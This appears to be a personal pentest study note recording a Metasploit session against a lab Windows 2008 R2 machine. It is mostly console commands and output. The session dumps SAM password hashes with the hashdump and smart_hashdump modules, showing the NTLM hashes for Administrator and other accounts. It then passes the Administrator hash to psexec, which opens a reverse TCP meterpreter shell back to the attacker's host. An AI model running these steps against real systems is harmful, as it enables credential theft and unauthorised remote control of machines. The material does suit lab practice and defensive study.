# Pre-requisite - [[SAM]]
- First we need to get the meterpreter shell on the target machine

## Loading Windows Gather Local User Account Password Hashes(Registry) module
```python
meterpreter > background
[*] Backgrounding session 1...
[*] Starting persistent handler(s)...
msf6 exploit(windows/smb/psexec) > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/hashdump) > run

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY dd91c9306524a269648bf7248e6b6a07...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
----------------------------SNIP----------------------------------------
[*] Post module execution completed

```

## Doing above stuffs but with different module
```python
msf6 post(windows/gather/hashdump) > use post/windows/gather/smart_hashdump
msf6 post(windows/gather/smart_hashdump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/smart_hashdump) > run

[*] Running module against VAGRANT-2008R2
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /root/.msf4/loot/20230401114808_default_192.168.216.11_windows.hashes_903436.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] 	Obtaining the boot key...
[*] 	Calculating the hboot key using SYSKEY dd91c9306524a269648bf7248e6b6a07...
[*] 	Obtaining the user list and keys...
[*] 	Decrypting user keys...
[*] 	Dumping password hints...
[*] 	No users with password hints on this system
[*] 	Dumping password hashes...
[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
[+] 	vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
[+] 	
----------------------------------SNIP-------------------------------------
[*] Post module execution completed
```
- If the target is a domain controller, it will dump the domain account database using the proper technique depending on privilege level, OS, and role of the host
- Above one name is Windows Gather local and Domain Controller Account Password Hashes.

## Passing the above Hash for meterpreter
```python
msf6 post(windows/gather/smart_hashdump) > use exploit/windows/smb/psexec
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOST 192.168.216.11
RHOST => 192.168.216.11
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
SMBPass => aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 192.168.216.9:4444 
[*] 192.168.216.11:445 - Connecting to the server...
[*] 192.168.216.11:445 - Authenticating to 192.168.216.11:445 as user 'Administrator'...
[*] 192.168.216.11:445 - Selecting PowerShell target
[*] 192.168.216.11:445 - Executing the payload...
[+] 192.168.216.11:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.216.11
[*] Meterpreter session 4 opened (192.168.216.9:4444 -> 192.168.216.11:49880) at 2023-04-01 12:29:50 +0530

meterpreter > 
```